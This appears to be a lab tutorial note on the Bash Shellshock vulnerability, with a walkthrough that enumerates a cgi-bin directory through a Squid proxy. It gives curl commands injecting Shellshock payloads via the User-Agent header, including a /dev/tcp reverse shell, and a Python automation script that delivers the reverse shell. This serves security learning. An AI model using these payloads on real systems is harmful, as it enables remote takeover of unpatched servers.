A **Shellshock** attack is a type of computer attack that exploits a vulnerability in the *Bash shell* on Unix and Linux-based operating systems. This vulnerability was discovered in 2014 and is considered one of the largest and most widespread attacks in the history of computing.

This vulnerability in Bash allows attackers to execute malicious commands on the affected system, allowing them to take control of the system and access sensitive information, modify files, install malware, etc.

The Shellshock vulnerability occurs in the Bash command interpreter, which is used by many Unix and Linux operating systems to execute shell scripts. The problem lies in the way Bash handles environment variables. Attackers can inject malicious code into these environment variables, which Bash executes without questioning their origin or content.

Attackers can exploit this vulnerability through different attack vectors. One of them is through the *User-Agent*, which is the information that the web browser sends to the web server to identify the type of browser and operating system being used. Attackers can manipulate the User-Agent to include malicious commands, which the web server will execute upon receiving the request.

# Example

----
> Caution: For this example we are going to use the same lab as in the [[SQUID Proxies - Enumeration and exploitation]] example, so before continuing proceed with that lab.
----

Before continuing with the example, let's assume that the IP of the *victim* machine is *192.168.50.214* and the port where the [[SQUID Proxies - Enumeration and exploitation]] is located is *3128*.

We are going to do a directory scan with **gobuster**, but this time we are going to add the *--add-slash* parameter. This parameter is important because it adds a slash at the end of the directories it finds and it is possible to find more directories that way:

```bash
gobuster dir -u http://192.168.50.214 --proxy http://192.168.50.214:3128 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

After scanning we found a directory called *cgi-bin/*.

----
> Normally, if you find a **cgi-bin/**, it may be possible to test a *ShellShock*.
----

When we find a *cgi-bin/* we are interested in seeing files with certain *extensions* as well as *without the extension*:

```bash
gobuster dir -u http://192.168.50.214 --proxy http://192.168.50.214:3128/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x pl,sh,cgi
```

We have found the *status* file, which we will use for exploitation:

```bash
# We need to specify the absolute path of the binaries we want to run
curl http://192.168.50.214/cgi-bin/status --proxy http://192.168.50.214:3128 -H "User-Agent: () { :; }; /usr/bin/whoami"

# In case it does not give us what we want, we can put echos before (one and sometimes even two)
curl http://192.168.50.214/cgi-bin/status --proxy http://192.168.50.214:3128 -H "User-Agent: () { :; }; echo; /usr/bin/whoami"

# We can run an one-liner Reverse Shell as well
curl http://192.168.50.214/cgi-bin/status --proxy http://192.168.50.214:3128 -H "User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.50.172/443 0>&1'"
```

Now we are going to create a *Python* script to automate the *ShellShock* attack:

```python
#!/usr/bin/python3

import requests
import sys
import signal
import threading

from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# It is the same to reference localhost or the IP of the machine when we are going through the SQUID Proxy.
main_url = "http://127.0.0.1/cgi-bin/status"
squid_proxy = {'http': 'http://192.168.50.214:3128'}
lport = 443

def shellshock_attack():
    headers = { 'User-Agent': "() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.50.172/443 0>&1'" }

    requests.get(main_url, headers=headers, proxies=squid_proxy)

if __name__ == '__main__':
    try:
	    # We create a thread with the function we want to run in the background
        threading.Thread(target=shellshock_attack, args=()).start()
    except Exception as e:
        log.error(str(e))

	# We are listening for 20 seconds waiting for a new connection to be established
    shell = listen(lport, timeout=20).wait_for_connection()

    if shell.sock is None:
        log.failure("Unable to establish connection")
        sys.exit(1)
    else:
        shell.interactive()
```

The *ShellShock* vulnerability is not widely seen, but can occur on *very old machines*.